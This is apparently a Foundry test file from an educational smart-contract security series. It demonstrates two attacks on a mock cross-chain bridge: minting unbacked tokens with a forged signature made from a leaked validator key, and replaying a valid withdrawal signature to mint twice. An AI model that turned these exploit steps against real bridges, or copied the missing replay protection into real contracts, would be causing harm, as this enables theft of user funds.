// SPDX-License-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import "../../../src/Multiverse-Case-Studies/Cross-Chain-Bridge/SourceBridge.sol";
import "../../../src/Multiverse-Case-Studies/Cross-Chain-Bridge/DestinationBridge.sol";
import "../../../src/Multiverse-Case-Studies/Cross-Chain-Bridge/MockMintableERC20.sol";

contract DoctorStrangeCrossChainExploit is Test {
    SourceBridge sourceBridge;
    DestinationBridge destBridge;
    MockMintableERC20 mockToken;
    address spiderMan = makeAddr("SpiderMan");
    address doctorStrange = makeAddr("DoctorStrange");
    uint256 validatorPk = 0xBEEF; // Real private key
    address validator;
    bytes32 bridgeId = keccak256("MultiverseBridge");

    function setUp() public {
        validator = vm.addr(validatorPk); // Derive address from PK
        mockToken = new MockMintableERC20("mETH", "mETH");
        sourceBridge = new SourceBridge(address(mockToken));
        destBridge = new DestinationBridge(validator, address(mockToken));

        // Fund Spider-Man
        mockToken.mint(spiderMan, 1000);

        // Verify Spider-Man's balance
        assertEq(mockToken.balanceOf(spiderMan), 1000, "Spider-Man should have 1000 mETH");
    }

    function signMessage(bytes32 messageHash, uint256 pk) internal pure returns (bytes memory) {
        bytes32 ethSignedMessageHash = MessageHashUtils.toEthSignedMessageHash(messageHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethSignedMessageHash);
        return abi.encodePacked(r, s, v);
    }

    function testSignatureForgery() public {
        // Step 1: Spider-Man approves and locks 1,000 mETH
        vm.startPrank(spiderMan);
        mockToken.approve(address(sourceBridge), 1000);

        // Verify allowance
        assertEq(
            mockToken.allowance(spiderMan, address(sourceBridge)), 1000, "SourceBridge should have 1000 mETH allowance"
        );

        sourceBridge.lockFunds(1000, 1);
        vm.stopPrank();

        // Verify lock
        assertEq(sourceBridge.totalLocked(), 1000, "SourceBridge should have 1000 mETH locked");
        assertEq(mockToken.balanceOf(address(sourceBridge)), 1000, "SourceBridge should hold 1000 mETH");

        // Simulate event data
        bytes32 sourceTxHash = keccak256(abi.encode(blockhash(block.number - 1), spiderMan, 1000, uint256(1)));

        // Step 2: Forge signature (attacker has validator key)
        bytes32 messageHash = keccak256(abi.encodePacked(doctorStrange, uint256(1000), uint256(1), sourceTxHash));
        bytes memory forgedSig = signMessage(messageHash, validatorPk);

        // Step 3: Attacker mints on destination
        vm.prank(doctorStrange);
        destBridge.withdraw(doctorStrange, 1000, 1, sourceTxHash, forgedSig);

        // Verify: Attacker got unbacked funds
        assertEq(mockToken.balanceOf(doctorStrange), 1000, "Forgery failed");
        assertEq(sourceBridge.totalLocked(), 1000, "Source drained unexpectedly");
    }

    function testReplayAttack() public {
        // Step 1: Spider-Man approves and locks 1,000 mETH
        vm.startPrank(spiderMan);
        mockToken.approve(address(sourceBridge), 1000);

        // Verify allowance
        assertEq(
            mockToken.allowance(spiderMan, address(sourceBridge)), 1000, "SourceBridge should have 1000 mETH allowance"
        );

        sourceBridge.lockFunds(1000, 1);
        vm.stopPrank();

        // Verify lock
        assertEq(sourceBridge.totalLocked(), 1000, "SourceBridge should have 1000 mETH locked");
        assertEq(mockToken.balanceOf(address(sourceBridge)), 1000, "SourceBridge should hold 1000 mETH");

        // Simulate event data
        bytes32 sourceTxHash = keccak256(abi.encode(blockhash(block.number - 1), spiderMan, 1000, uint256(1)));

        // Step 2: Create valid signature
        bytes32 messageHash = keccak256(abi.encodePacked(spiderMan, uint256(1000), uint256(1), sourceTxHash));
        bytes memory validSig = signMessage(messageHash, validatorPk);

        // Step 3: Legitimate withdraw
        vm.prank(spiderMan);
        destBridge.withdraw(spiderMan, 1000, 1, sourceTxHash, validSig);
        assertEq(mockToken.balanceOf(spiderMan), 1000, "Legit withdraw failed");

        // Step 4: Replay attack with same parameters
        vm.prank(doctorStrange);
        destBridge.withdraw(spiderMan, 1000, 1, sourceTxHash, validSig); // Use spiderMan as 'to' address

        // Verify: Attacker successfully replayed and minted extra tokens
        assertEq(mockToken.balanceOf(spiderMan), 2000, "Replay attack failed to mint extra tokens");
    }
}
